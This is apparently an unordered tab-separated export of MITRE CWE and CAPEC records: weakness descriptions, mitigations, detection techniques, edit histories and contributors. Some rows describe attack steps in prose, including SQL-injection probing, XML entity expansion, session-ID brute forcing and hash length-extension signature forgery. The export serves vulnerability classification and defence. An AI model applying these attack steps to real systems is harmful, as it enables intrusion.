17399	52	This weakness can often be detected using automated static analysis tools. Many modern tools use data flow analysis or constraint-based techniques to minimize the number of false positives.                   Automated static analysis generally does not account for environmental considerations when reporting out-of-bounds memory operations. This can make it difficult for users to determine which warnings should be investigated first. For example, an analysis tool might report buffer overflows that originate from command line arguments in a program that is not expected to run with setuid or other special privileges.
10903	39	2009-07-27
11625	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.
7663	102	ChildOf
16599	28	CWE Content Team
20713	101	CAPEC Content Team
12322	62	updated Relationships
10510	62	updated Causal_Nature, Demonstrative_Examples, Likelihood_of_Exploit, Modes_of_Introduction, References, Relationships
23252	46	This programming pattern can be inefficient in comparison with use of text buffer data elements. This issue can make the software perform more slowly.  If the relevant code is reachable by an attacker, then this performance problem might introduce a vulnerability.
13905	31	1000
16739	76	2015-11-09
15779	39	2008-09-08
11944	35	MITRE
9010	39	2012-05-11
7536	28	CWE Content Team
8804	62	updated Potential_Mitigations, Time_of_Introduction
13433	28	CWE Content Team
14098	28	CWE Content Team
8590	31	699
16980	91	Implementation
9332	62	updated Relationships
25324	100	The MITRE Corporation
18746	91	Operation
16681	62	updated Relationships, Taxonomy_Mappings
13989	91	Architecture and Design
22986	39	2011-06-27
14663	35	MITRE
7390	33	Thomas Prescher
14269	35	Cigital
21499	56	CanPrecede
23598	81	Confidentiality
9948	35	MITRE
11656	31	699
7588	44	High
16257	69	Incomplete
6602	28	CWE Content Team
9905	28	CWE Content Team
15813	101	CAPEC Content Team
11903	23	An attacker manipulates either egress or ingress data from a client within an application framework in order to change the destination and/or content of buttons displayed to a user within API messages. Performing this attack allows the attacker to manipulate content in such a way as to produce messages or content that looks authentic but contains buttons that point to an attacker controlled destination.
11053	81	Integrity
11658	73	Intercept or modify a query, or send a bogus query with known credentials (such as transaction ID).
19038	104	1062
6978	28	CWE Content Team
12429	49	2007
14066	25	Low
24097	45	Base
21707	62	updated Potential_Mitigations
19967	28	CWE Content Team
24182	39	2011-06-01
24609	61	Draft
11646	62	updated Taxonomy_Mappings
11077	59	Updated Taxonomy_Mappings
7830	31	1000
13673	23	The web application does not sufficiently verify inputs that are assumed to be immutable but are actually externally controllable, such as hidden form fields.
9039	91	Implementation
12859	35	MITRE
11819	21	CWE Content Team
15663	35	MITRE
21147	43	Simple
13685	100	The MITRE Corporation
13420	35	MITRE
5746	21	PLOVER
16141	31	1000
10183	28	CWE Content Team
14268	73	The attacker probes by exploring an application's functionality and its underlying mapping to server-side components.
9053	39	2009-03-10
7183	39	2014-02-18
13048	47	Resource Consumption
10080	26	Operation
22679	28	CWE Content Team
17225	62	updated Common_Consequences, Description, Potential_Mitigations, Terminology_Notes
17079	91	Build and Compilation
9000	39	2010-06-21
11875	62	updated Demonstrative_Examples, Relationships
20903	77	Dynamic Analysis with Manual Results Interpretation
19890	39	2017-01-19
10605	39	2009-12-28
8402	62	updated Relationships, Taxonomy_Mappings
12062	35	MITRE
8398	76	2019-04-04
14176	51	2015-11-09
19858	63	Unexpected State
7107	91	Architecture and Design
21475	28	CWE Content Team
10731	62	updated Time_of_Introduction
22258	39	2017-01-19
12819	91	Operation
6987	92	Experiment
22976	28	CWE Content Team
14288	43	Simple
8580	28	CWE Content Team
5679	45	Base
9115	33	J. Whittaker
18343	90	Language-Independent
23446	39	2017-11-08
21660	35	MITRE
24806	101	CAPEC Content Team
22701	97	Cellular Data Injection
20593	28	Eric Dalci
11506	33	Michael Gegick
16000	51	2014-06-23
12941	97	Target Influence via Framing
19025	28	CWE Content Team
16588	79	Access Control
20375	35	MITRE
16866	102	ChildOf
5934	59	Updated Attack_Motivation-Consequences, Description Summary, References
19052	62	updated Demonstrative_Examples, Enabling_Factors_for_Exploitation, Modes_of_Introduction, Observed_Examples, Relationships
10615	81	Access Control
12011	28	CWE Content Team
20359	35	MITRE
18764	55	CAPEC Content Team
21530	56	ChildOf
12420	101	CAPEC Content Team
21014	94	A successful attack will deny, degrade, or disrupt availability of satellite communications for the target by overwhelming its resources to accurately receive authorized transmissions.
6218	85	67
17400	101	CAPEC Content Team
11006	28	CWE Content Team
25090	45	Base
12443	74	1
17235	28	Sean Eidemiller
14935	36	https://www.owasp.org/images/b/ba/AppsecEU09_CarettoniDiPaola_v0.8.pdf
23535	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.
19212	28	CWE Content Team
14893	90	Java
16184	28	CWE Content Team
10084	88	Missing Initialization of a Variable
11517	39	2014-02-18
7295	88	Improper Validation of Function Hook Arguments
11356	28	CWE Content Team
10949	50	Implementation: Implement communications to and from the registry using secure protocols
20640	72	When the consequence is arbitrary code execution, this can often be used to subvert any other security service.
19458	34	OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.
16488	28	CWE Content Team
23470	88	Automated Recognition Mechanism with Inadequate Detection or Handling of Adversarial Input Perturbations
16512	39	2009-05-27
24483	79	Integrity
22015	35	MITRE
13730	25	Low
5583	66	Guide to Protecting the Confidentiality of Personally Identifiable Information (SP 800-122)
25394	77	Manual Analysis
20787	103	Primary
12831	42	Compartmentalize the system to have "safe" areas where trust boundaries can be unambiguously drawn. Do not allow sensitive data to go outside of the trust boundary and always be careful when interfacing with a compartment outside of the safe area.                   Ensure that appropriate compartmentalization is built into the system design and that the compartmentalization serves to allow for and further reinforce privilege separation functionality. Architects and designers should rely on the principle of least privilege to decide when it is appropriate to use and to drop system privileges.
11913	74	2
24962	76	2015-11-09
16745	35	MITRE
6173	21	Evgeny Lebanidze
11861	69	Incomplete
10104	35	MITRE
14655	95	[Redirect users to malicious website] As the attacker succeeds in exploiting the vulnerability, he is able to manipulate and interpose malicious response data to targeted victim queries.
10282	39	2017-01-19
10298	39	2014-07-30
15147	103	Primary
25214	62	updated Common_Consequences
20518	39	2012-05-11
13791	35	MITRE
19319	28	CWE Content Team
25274	56	ChildOf
23971	35	MITRE
25203	35	MITRE
17738	48	03
19071	85	101
7513	90	Perl
19084	101	CAPEC Content Team
12398	69	Draft
15435	31	1000
20492	95	[Adversary lures victim to clickjacking page] Adversary utilizes some form of temptation, misdirection or coercion to lure the victim to loading and interacting with the clickjacking page in a way that increases the chances that the victim will click in the right areas.
13017	28	CWE Content Team
19239	100	The MITRE Corporation
20218	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Context-configured Source Code Weakness Analyzer
17204	89	Meta
15682	76	2019-09-30
17143	94	Run Arbitrary Code
22667	28	CWE Content Team
20141	39	2008-09-08
12531	100	The MITRE Corporation
13429	28	CWE Content Team
23042	23	When web services require callees to authenticate, they sometimes issue a token / secret to the caller that the caller is to use to sign their web service calls. In one such scheme the caller when constructing a request would concatenate all of the parameters passed to the web service with the provided authentication token and then generate a hash of the concatenated string (e.g., MD5, SHA1, etc.). That hash then forms the signature that is passed to the web service which is used on the server side to verify the origin authenticity and integrity of the message. There is a practical attack against an authentication scheme of this nature that makes use of the hash function extension / padding weakness. Leveraging this weakness, an attacker, who does not know the secret token, is able to modify the parameters passed to the web service by generating their own call and still generate a legitimate signature hash. For instance, consider the message to be passed to the web service is M (this message includes the parameters passed to the web service concatenated with the secret token / key bytes). The message M is hashed and that hash is passed to the web service and is used for authentication. The attacker does not know M, but can see Hash (M) and Length (M). The attacker can then compute Hash (M || Padding (M) || M') for any M'. The attacker does not know the entire message M, specifically the attacker does not know the secret bytes, but that does not matter. The attacker is still able to sign their own message M' and make the called web service verify the integrity of the message without an error. Because of the iterative design of the hash function, it is possible, from only the hash of a message and its length, to compute the hash of longer messages that start with the initial message and include the padding required for the initial message to reach a multiple of 512 bits. It is important to note that the attack not limited to MD5 and will work just as well with another hash function like SHA1.
14374	99	SANS Software Security Institute
14363	62	updated Common_Consequences
15132	35	MITRE
24025	42	Use dynamic tools and techniques that interact with the software using large test suites with many diverse inputs, such as fuzz testing (fuzzing), robustness testing, and fault injection. The software's operation may slow down, but it should not become unstable, crash, or generate incorrect results.
14850	26	Architecture and Design
9141	56	ChildOf
24305	21	CLASP
24151	56	ChildOf
6826	28	CWE Content Team
12807	53	The MITRE Corporation
10396	77	Manual Static Analysis - Binary or Bytecode
21047	62	updated Relationships
11106	39	2009-03-10
19467	28	CWE Content Team
6636	86	http://blogs.sans.org/appsecstreetfighter/2010/03/23/top-25-series-rank-22-allocation-of-resources-without-limits-or-throttling/
8946	60	12
19470	90	Language-Independent
10807	62	updated Related_Attack_Patterns
22057	50	Implementation: Perform testing such as pen-testing and vulnerability scanning to identify directories, programs, and interfaces that grant direct access to executables.
17121	31	1000
13340	74	3
14576	39	2017-11-08
17675	28	CWE Content Team
10329	39	2014-06-23
16103	42	Use grep or static analysis tools to spot usage of dangerous functions.
6558	77	Automated Static Analysis
9454	78	Very High
9686	69	Draft
8407	104	94
5892	62	updated References, Demonstrative_Example, Potential_Mitigations, Time_of_Introduction
25386	62	updated Relationships, Other_Notes, Taxonomy_Mappings
9791	35	MITRE
13310	42	Memory should be allocated/freed using matching functions such as malloc/free, new/delete, and new[]/delete[].
10506	62	updated Applicable_Platforms, Background_Details, Description, Relationships, Taxonomy_Mappings, Weakness_Ordinalities
16544	92	Experiment
7436	85	417
16720	42	Ensure that any possibly sensitive data specified in the requirements is verified with designers to ensure that it is either a calculated risk or mitigated elsewhere. Any information that is not necessary to the functionality should be removed in order to lower both the overhead and the possibility of security sensitive data being sent.
18887	46	As data is parsed, improperly handled internal special elements may cause the process to take unexpected actions that result in an attack.
17097	31	1000
6472	23	The application stores sensitive information in cleartext in memory.
18363	95	The server decodes and interprets the URL string. Unfortunately since the input filtering is not done properly, the special characters may have harmful consequences.
19017	103	Primary
23419	77	Architecture or Design Review
15474	62	updated Potential_Mitigations
23115	56	ChildOf
19113	35	Cigital
7050	44	High
17333	28	CWE Content Team
20898	62	updated Relationships
6353	51	2019-09-30
18024	28	CWE Content Team
21861	100	The MITRE Corporation
7898	56	ChildOf
18606	62	updated Relationships
18453	88	Buffer Access with Incorrect Length Value
23532	28	CWE Content Team
11478	39	2013-02-21
9680	95	[Survey the Application] The attacker surveys the target application, possibly as a valid and authenticated user
22369	62	updated Time_of_Introduction
23544	39	2008-07-01
6471	40	The targeted client software communicates with an external server.
15399	48	03
16563	74	1
11767	39	2012-10-30
6458	77	Manual Static Analysis - Binary or Bytecode
21974	62	updated Relationships
17287	79	Availability
13772	59	Updated Related_Attack_Patterns, Resources_Required
19248	56	ChildOf
11625	26	Implementation
14214	50	Validate XML against a valid schema or DTD prior to parsing.
13725	89	Standard
19143	42	Ensure that protocols have specific limits of scale placed on them.
16425	101	CAPEC Content Team
23037	88	Excessive Halstead Complexity
24700	28	CWE Content Team
10596	28	CWE Content Team
18850	39	2011-03-29
11022	26	Implementation
15337	39	2017-01-19
11585	35	MITRE
17743	79	Access Control
8777	39	2017-11-08
11326	104	1084
6809	85	593
25027	39	2011-06-01
24091	62	updated Common_Consequences
25410	28	CWE Content Team
16149	62	updated Time_of_Introduction
6471	50	Use a language or compiler that performs automatic bounds checking.
6887	56	CanAlsoBe
14408	42	Do not use member fields to store information in the Servlet. In multithreading environments, storing user data in Servlet member fields introduces a data access race condition.
20813	66	Top 25 Series - Rank 12 - Buffer Access with Incorrect Length Value
12033	39	2014-07-30
8159	89	Meta
5749	62	updated Demonstrative_Examples
20759	76	2017-01-09
19313	104	520
22651	26	Implementation
7783	81	Integrity
19003	28	CWE Content Team
18867	62	updated References, Relationships
12158	62	updated Description, Other_Notes
16269	35	MITRE
15005	62	updated Related_Attack_Patterns
6771	45	Variant
19770	35	MITRE
6997	62	updated Common_Consequences
6184	39	2012-05-11
6369	39	2015-12-07
20377	100	The MITRE Corporation
14780	77	Automated Static Analysis
19427	62	updated Potential_Mitigations
21460	40	Advanced knowledge about the download and update installation processes.
21258	39	2009-07-27
23910	39	2011-06-01
12010	28	CWE Content Team
18787	46	This issue makes it more difficult to understand and/or maintain the software, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities.  It also might make it easier to introduce vulnerabilities.
20469	35	MITRE
24543	26	Implementation
15716	35	MITRE
14031	28	CWE Content Team
18513	79	Confidentiality
14797	26	Implementation
19492	79	Integrity
10527	28	CWE Content Team
14058	39	2017-11-08
6177	103	Primary
6189	69	Incomplete
5717	88	Use of Same Variable for Multiple Purposes
23641	39	2009-10-29
10821	59	Updated Activation_Zone, Attack_Motivation-Consequences, Attack_Prerequisites, Attacker_Skills_or_Knowledge_Required, Description Summary, Injection_Vector, Payload, Payload_Activation_Impact, Resources_Required, Solutions_and_Mitigations
16278	28	CWE Content Team
6030	88	Path Traversal: '...' (Triple Dot)
19982	50	Design: Ensure that function calls that should not be called by an unprivileged user are not accessible to them.
16056	62	updated Time_of_Introduction
13061	62	updated Applicable_Platforms, Common_Consequences
16810	102	ChildOf
7552	104	1105
22991	59	Updated Related_Attack_Patterns
14491	28	Eric Dalci
23677	39	2011-09-13
9872	39	2019-01-03
24437	63	DoS: Crash, Exit, or Restart
20250	103	Primary
6390	85	48
23195	62	updated Applicable_Platforms, Causal_Nature, Modes_of_Introduction, Relationships, Type
15443	35	Cigital
14340	76	2019-04-04
11461	39	2008-11-24
12687	39	2011-06-01
10603	69	Draft
8861	31	1000
6877	56	ChildOf
11222	28	CWE Content Team
7065	28	CWE Content Team
23987	28	CWE Content Team
15666	31	1000
16449	92	Experiment
22040	40	The target application must include the use of APIs that execute scripts.
6614	35	MITRE
9286	81	Integrity
6283	103	Primary
22623	23	The software declares a critical variable, field, or member to be public when intended security policy requires it to be private.
15314	26	Implementation
14108	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.
18059	79	Authorization
10190	32	O'Reilly Media, Inc.
6901	35	MITRE
8140	31	1000
19335	28	CWE Content Team
13633	28	CWE Content Team
14108	26	Architecture and Design
16102	39	2008-09-08
15947	70	OWASP Testing Guide
11564	35	MITRE
23654	62	updated Observed_Examples, Relationships
20246	28	CWE Content Team
12970	28	CWE Content Team
22093	101	CAPEC Content Team
22335	35	MITRE
24338	53	The MITRE Corporation
22037	35	MITRE
18669	43	Simple
11797	78	High
24911	67	High
15878	62	updated Relationships, Taxonomy_Mappings
21284	79	Authorization
15765	28	CWE Content Team
24659	28	CWE Content Team
13561	62	updated Common_Consequences
23665	53	The MITRE Corporation
11985	92	Exploit
23459	56	ChildOf
22335	39	2011-06-01
21300	101	CAPEC Content Team
15748	39	2014-06-23
13593	35	MITRE
22307	31	699
16305	88	Only Filtering One Instance of a Special Element
9002	28	CWE Content Team
25186	42	Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass whitelist validation schemes by introducing dangerous inputs after they have been checked.
7908	104	337
22189	101	CAPEC Content Team
17610	100	The MITRE Corporation
19246	100	The MITRE Corporation
15295	39	2019-01-03
25041	62	updated Relationships, Taxonomy_Mappings
16515	28	CWE Content Team
10874	61	Draft
21949	35	MITRE
16335	53	The MITRE Corporation
9309	45	Variant
7630	39	2017-11-08
16604	63	Read Application Data
24024	62	updated Applicable_Platforms
16115	62	updated Applicable_Platforms, Likelihood_of_Exploit, Potential_Mitigations
14688	56	ChildOf
8136	95	[Survey the target] Using a browser or an automated tool, an attacker records all instances of web services to process XML requests.
9559	32	SecurityFocus
12784	102	ChildOf
11768	31	1000
20810	103	Primary
13096	90	Language-Independent
11373	28	CWE Content Team
16912	35	MITRE
8322	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.
10551	45	Class
13278	72	The user may be redirected to an untrusted page that contains malware which may then compromise the user's machine. This will expose the user to extensive risk and the user's interaction with the web server may also be compromised if the malware conducts keylogging or other attacks that steal credentials, personally identifiable information (PII), or other important data.
9993	92	Explore
18265	102	ChildOf
23581	80	Once the adversary has logical access (which can potentially require high knowledge and skill level), the adversary needs only to leverage the relevant command for screen capture.
23818	85	293
5625	35	MITRE
10169	39	2008-09-08
19692	85	303
11762	35	MITRE
13069	28	CWE Content Team
18939	39	2008-09-08
10446	81	Other
11662	45	Base
5675	35	MITRE
22655	73	Direct request of protected pages that directly access database back-ends. (e.g., list.jsp, accounts.jsp, status.jsp, etc.)
11546	35	Cigital
10517	28	CWE Content Team
9528	35	MITRE
13300	43	Simple
22590	62	updated Description
21108	73	Include the malicious link on the attackers' own website where the user may have to click on the link, or where an XMLHTTPRequest object may automatically execute the attack when a user visits the site.
22311	69	Draft
19232	62	updated Relationships, Taxonomy_Mappings
17652	60	27
8804	28	Eric Dalci
20728	76	2017-08-04
5783	62	updated Common_Consequences
15134	55	CAPEC Content Team
10596	39	2014-07-30
9754	79	Accountability
8677	28	CWE Content Team
8062	59	Updated Related_Attack_Patterns
5997	28	CWE Content Team
10665	55	CAPEC Content Team
19835	39	2014-06-23
12561	76	2018-07-31
9201	56	ChildOf
20848	28	CWE Content Team
6320	31	1000
21299	48	08
21807	70	Look-10-007 - Tapjacking
6446	24	MITRE
24109	62	updated Description, Maintenance_Notes
7498	44	SOAR Partial
14735	35	MITRE
23129	91	Implementation
6386	28	CWE Content Team
15555	62	updated Description, Other_Notes, Relationships
21344	35	MITRE
13692	80	Ability to stealthly gain access via remote compromise or physical access to the manufacturer's documentation.
13768	81	Confidentiality
11974	25	Low
20704	35	MITRE
5636	47	Execute Unauthorized Commands
23572	91	Implementation
15844	90	Language-Independent
10870	39	2011-03-29
8533	92	Explore
17541	85	306
14318	56	ChildOf
22796	39	2012-05-11
22851	23	The software receives a request, message, or directive from an upstream component, but the software does not sufficiently preserve the original source of the request before forwarding the request to an external actor that is outside of the software's control sphere. This causes the software to appear to be the source of the request, leading it to act as a proxy or other intermediary between the upstream component and the external actor.
11047	79	Availability
9047	39	2014-07-30
7225	35	MITRE
25188	28	CWE Content Team
9519	76	2017-08-04
6753	56	ChildOf
12577	59	Updated Alternate_Terms, Description, Execution_Flow, Related_Attack_Patterns
8150	28	CWE Content Team
5941	35	MITRE
18181	81	Non-Repudiation
18506	35	MITRE
12260	101	CAPEC Content Team
8095	35	MITRE
21236	63	Quality Degradation
10855	42	Validate that the length of the user-supplied data is consistent with the buffer size.
16477	28	CWE Content Team
15385	55	CAPEC Content Team
16107	39	2008-07-01
24626	39	2011-06-01
18045	90	Language-Independent
18748	39	2012-05-11
13858	35	MITRE
21181	50	Any security checks should occur after the data has been decoded and validated as correct data format. Do not repeat decoding process, if bad character are left after decoding process, treat the data as suspicious, and fail the validation process.
9567	28	CWE Content Team
21183	62	updated Common_Consequences, Description, Relationships, Taxonomy_Mappings
21871	62	updated References
12339	90	C
10867	23	A web application accepts a user-controlled input that specifies a link to an external site, and uses that link in a Redirect. This simplifies phishing attacks.
7391	35	MITRE
23575	100	The MITRE Corporation
24607	95	[Find the insertion point for the payload] The attacker first needs to find some system functionality or possibly another weakness in the system (e.g. susceptibility to cross site scripting) that would provide the attacker with a mechanism to deliver the payload (i.e. the code to be executed) to the user. The location from which this code is executed in the user's browser needs to be within the local machine zone.
18250	103	Primary
23406	88	Data Element containing Pointer Item without Proper Copy Control Element
16568	95	[Launch an XML Entity Expansion attack] The attacker crafts malicious XML message to force recursive entity expansion (or other repeated processing) that completely uses up available server resource.
13620	28	CWE Content Team
19183	28	CWE Content Team
7271	35	MITRE
15699	27	The attacker must trick the victim into following a crafted link to a vulnerable server or view a web post where the dangerous commands are executed.
19671	103	Primary
21149	28	CWE Content Team
23252	43	Simple
7413	42	Limit the interleaving of operations on files from multiple processes.
7855	101	CAPEC Content Team
19680	102	ChildOf
9858	35	MITRE
6217	66	Real-Life Example of a 'Business Logic Defect' (Screen Shots!)
23715	51	2014-06-23
13124	39	2008-10-14
21943	31	1000
19607	39	2014-06-23
21035	39	2008-07-01
5920	35	MITRE
19609	35	MITRE
15463	62	updated Time_of_Introduction
17571	56	ChildOf
18564	60	11
16888	28	CWE Content Team
22170	62	updated Causal_Nature, Functional_Areas, Relationships, Taxonomy_Mappings
6636	99	SANS Software Security Institute
16423	81	Availability
10395	76	2019-09-30
18688	92	Explore
19029	62	updated Demonstrative_Examples
18158	33	Dumitru Erhan
19183	35	MITRE
22933	56	ChildOf
18315	28	CWE Content Team
7602	39	2008-09-08
15089	42	Verify the integrity of the software that is being installed.
23476	44	SOAR Partial
25077	35	MITRE
12896	52	According to SOAR, the following detection techniques may be useful:                                         Highly cost effective:                                                                           Manual Source Code Review (not inspections)                                                                     Cost effective for partial coverage:                                                                           Focused Manual Spotcheck - Focused manual analysis of source
9082	53	The MITRE Corporation
23255	48	09
17268	42	Avoid making decisions based on names of resources (e.g. files) if those resources can have alternate names.
15164	62	updated Relationships, Other_Notes, Taxonomy_Mappings
24638	39	2011-06-01
19009	56	ChildOf
13140	28	Eric Dalci
17052	35	MITRE
19376	28	CWE Content Team
22616	35	MITRE
24195	81	Other
9756	28	CWE Content Team
10012	104	733
16490	28	CWE Content Team
19246	101	CAPEC Content Team
12527	35	MITRE
10112	39	2011-06-01
5707	55	CAPEC Content Team
10950	42	Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass whitelist validation schemes by introducing dangerous inputs after they have been checked.
17307	91	Requirements
19136	42	Implement password aging functionality that requires passwords be changed after a certain point.
22162	91	Architecture and Design
13026	39	2011-03-29
14085	28	CWE Content Team
19260	76	2018-07-31
16330	39	2014-06-23
13112	39	2013-07-17
10275	44	SOAR Partial
16395	28	CWE Content Team
21589	31	1000
23911	63	Varies by Context
5598	42	Debugging information should not make its way into a production release.
19259	62	updated Relationships
7681	62	updated Demonstrative_Examples, References, Relationships, Taxonomy_Mappings
16624	85	326
8627	62	updated Description, Other_Notes
24836	39	2017-11-08
23895	42	Disable Windows from supporting 8.3 filenames by editing the Windows registry. Preventing 8.3 filenames will not remove previously generated 8.3 filenames.
18056	103	Primary
14498	26	Implementation
7356	32	International Conference on Mobile Systems, Applications, and Services (MobiSys)
13736	23	An attacker manipulates either egress or ingress data from a client within an application framework in order to change the destination and/or content of links/buttons displayed to a user within API messages. Performing this attack allows the attacker to manipulate content in such a way as to produce messages or content that looks authentic but contains links/buttons that point to an attacker controlled destination. Some applications make navigation remapping more difficult to detect because the actual HREF values of images, profile elements, and links/buttons are masked. One example would be to place an image in a user's photo gallery that when clicked upon redirected the user to an off-site location. Also, traditional web vulnerabilities (such as CSRF) can be constructed with remapped buttons or links. In some cases navigation remapping can be used for Phishing attacks or even means to artificially boost the page view, user site reputation, or click-fraud.
24237	62	updated Common_Consequences, Description, Detection_Factors, Relationships, Observed_Example, Relationship_Notes, Taxonomy_Mappings
22643	103	Primary
12252	79	Availability
25247	59	Updated Related_Attack_Patterns
10816	35	MITRE
19750	50	One solution to this problem is to protect encrypted data with a CRC of some sort. If knowing who last manipulated the data is important, then using a cryptographic "message authentication code" (or hMAC) is prescribed. However, this guidance is not a panacea. In particular, any value created by (and therefore encrypted by) the client, which itself is a "malicious" value, all the protective cryptography in the world can't make the value 'correct' again. Put simply, if the client has control over the whole process of generating and encoding the value, then simply protecting its integrity doesn't help.
12615	79	Access Control
20633	26	Operation
15902	40	An adversary must be able install a purpose built malicious application onto the Android device and convince the user to execute it. The malicious application will be used to issue spoofed intents.
24861	39	2012-05-11
25132	95	An attacker then ads a postfix NULL terminator to the supplied input in order to "swallow" the postfixed data when the insertion is taking place. With the postfix data that got in the way of the attack gone, the doors are opened for accessing the desired resources.
16179	76	2018-07-31
11648	23	The software receives input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could be interpreted as variable name delimiters when they are sent to a downstream component.
13020	39	2008-09-08
7618	63	DoS: Resource Consumption (CPU)
10319	28	CWE Content Team
21150	39	2012-10-30
12152	28	CWE Content Team
18155	56	ChildOf
18850	62	updated Potential_Mitigations
17575	62	updated Relationships
13743	91	Architecture and Design
5692	103	Primary
9054	55	CAPEC Content Team
20511	104	462
23961	53	The MITRE Corporation
18730	38	If the attacker is able to perform the checking offline then there will likely be no indication that an attack is ongoing.
13102	91	Operation
18678	33	Ludovico Cavedon
9174	76	2019-04-04
23990	35	MITRE
15922	28	CWE Content Team
12421	62	updated Likelihood_of_Exploit, Relationships
10354	28	Sean Eidemiller
9488	100	The MITRE Corporation
6885	49	2012
8132	80	More advanced attack may require knowledge of the protocol spoken by the host service.
15337	28	CWE Content Team
18522	50	When maintaining an authenticated session with a privileged target system, do not use the same browser to navigate to unfamiliar sites to perform other activities. Finish working with the target system and logout first before proceeding to other tasks.
9248	39	2019-06-20
19521	28	CWE Content Team
13158	39	2009-05-27
20518	62	updated References, Relationships
23702	62	updated Potential_Mitigations, Time_of_Introduction
12841	39	2010-02-16
15642	35	MITRE
10917	91	Installation
8364	63	Modify Files or Directories
18568	35	MITRE
24332	69	Draft
16366	63	Hide Activities
22546	39	2019-01-03
15810	42	Run the code in a "jail" or similar sandbox environment that enforces strict boundaries between the process and the operating system. This may effectively restrict which files can be accessed in a particular directory or which commands can be executed by the software.                   OS-level examples include the Unix chroot jail, AppArmor, and SELinux. In general, managed code may provide some protection. For example, java.io.FilePermission in the Java SecurityManager allows the software to specify restrictions on file operations.                   This may not be a feasible solution, and it only limits the impact to the operating system; the rest of the application may still be subject to compromise.                   Be careful to avoid CWE-243 and other weaknesses related to jails.
24392	61	Stable
11253	91	Operation
21096	28	CWE Content Team
14031	35	MITRE
21803	31	1000
17150	101	CAPEC Content Team
24910	28	CWE Content Team
16117	91	Implementation
8204	28	CWE Content Team
11571	79	Integrity
8390	59	Updated Attack_Phases, Description, Description Summary, Related_Vulnerabilities
13513	104	625
11519	42	For outbound authentication: store passwords, keys, and other credentials outside of the code in a strongly-protected, encrypted configuration file or database that is protected from access by all outsiders, including other local users on the same system. Properly protect the key (CWE-320). If you cannot use encryption to protect the file, then make sure that the permissions are as restrictive as possible [REF-7].                   In Windows environments, the Encrypted File System (EFS) may provide some protection.
21070	62	updated Demonstrative_Examples
14440	63	Reduce Reliability
9744	28	CWE Content Team
14386	35	MITRE
15333	25	Medium
20907	46	This issue can make the software perform more slowly.  If the relevant code is reachable by an attacker, then this performance problem might introduce a vulnerability.
5607	95	Determine the nature of messages being transported as well as the identifiers to be used as part of the attack
18355	62	updated Potential_Mitigations, Relationships, Taxonomy_Mappings
11049	101	CAPEC Content Team
10082	39	2010-04-05
22385	100	The MITRE Corporation
17186	21	PLOVER
9099	62	updated Relationships, Other_Notes, Taxonomy_Mappings
6175	62	updated Common_Consequences, Description, Other_Notes, Potential_Mitigations
11887	28	CWE Content Team
14081	28	CWE Content Team
6123	88	Improper Neutralization of Directives in Statically Saved Code ('Static Code Injection')
12891	39	2008-07-01
5946	102	ChildOf
19285	28	CWE Content Team
6421	35	Cigital
11976	25	Medium
21268	91	Implementation
15551	28	CWE Content Team
9341	100	The MITRE Corporation
13192	80	Requires the ability to write scripts of some complexity and to inject it through user controlled fields in the system.
7396	39	2010-04-05
5859	35	MITRE
23061	39	2009-12-28
23986	91	Architecture and Design
24675	62	updated Related_Attack_Patterns
19051	63	Execute Unauthorized Code or Commands
14418	95	[Determine user-controllable input susceptible to injection] Determine the user-controllable input susceptible to injection. For each user-controllable input that the attacker suspects is vulnerable to SQL injection, attempt to inject characters that have special meaning in SQL (such as a single quote character, a double quote character, two hyphens, a parenthesis, etc.). The goal is to create a SQL query with an invalid syntax.
18232	103	Primary
22488	62	updated Description, Related_Attack_Patterns
14123	35	MITRE
13377	39	2009-03-10
7512	43	Simple
6818	80	To achieve a redirection and use of less trusted source, an attacker can simply edit HTTP Headers that are sent to client machine.
15712	28	CWE Content Team
11880	45	Base
6268	76	2018-07-31
12689	56	ChildOf
22559	39	2012-05-11
18494	35	MITRE
18588	67	Medium
24751	62	updated Potential_Mitigations
7187	102	ChildOf
7133	86	http://www.slideshare.net/frohoff1/appseccali-2015-marshalling-pickles
22157	104	509
22127	91	Testing
15662	63	Alter Execution Logic
13326	61	Draft
24290	56	ChildOf
14122	79	Confidentiality
19994	35	MITRE
16001	39	2014-06-23
5635	39	2010-04-05
9687	90	Language-Independent
19357	77	Black Box
16959	35	MITRE
5680	35	MITRE
22135	31	699
12463	51	2014-06-23
13308	47	Read Data
7253	62	updated Relationships
12904	28	CWE Content Team
18695	62	updated Description, Name
25194	81	Other
24702	62	updated Relationships
6301	28	CWE Content Team
21999	39	2014-07-30
8054	39	2015-12-07
15901	100	The MITRE Corporation
24286	96	2010-01-15
7261	101	CAPEC Content Team
15358	62	updated Relationships
19316	91	Architecture and Design
17824	62	updated Potential_Mitigations, Time_of_Introduction
23678	35	MITRE
18763	35	KDM Analytics
19990	101	CAPEC Content Team
18304	39	2014-06-23
8296	101	CAPEC Content Team
7433	56	ChildOf
15794	62	updated Time_of_Introduction
23523	31	1000
17613	28	CWE Content Team
8452	28	CWE Content Team
24345	81	Other
13134	89	Standard
23796	39	2011-06-01
16073	35	MITRE
14635	35	MITRE
7391	62	updated Applicable_Platforms, Relationships, Taxonomy_Mappings
10210	39	2014-02-18
17670	68	Be aware that some versions of PHP will still accept ftp:// and other URI schemes. In addition, this setting does not protect the code from path traversal attacks (CWE-22), which are frequently successful against the same vulnerable code that allows remote file inclusion.
10895	35	MITRE
20078	63	Modify Files or Directories
14879	35	MITRE
20029	28	CWE Content Team
20020	76	2019-04-04
24623	26	Implementation
22529	43	Simple
17806	103	Primary
25413	103	Primary
23950	95	[Match issued IDs] The attacker brute forces different values of session ID and manages to predict a valid session ID.
6204	63	Unexpected State
20235	39	2014-07-30
21032	101	CAPEC Content Team
23975	28	CWE Content Team
11119	39	2012-10-30
8367	39	2009-03-10
9011	35	Cigital
23044	97	Accessing Functionality Not Properly Constrained by ACLs
19133	91	Implementation
10073	35	MITRE
18781	35	MITRE
15488	56	ChildOf
7764	23	The software stores or transmits sensitive data using an encryption scheme that is theoretically sound, but is not strong enough for the level of protection required.
20129	28	CWE Content Team
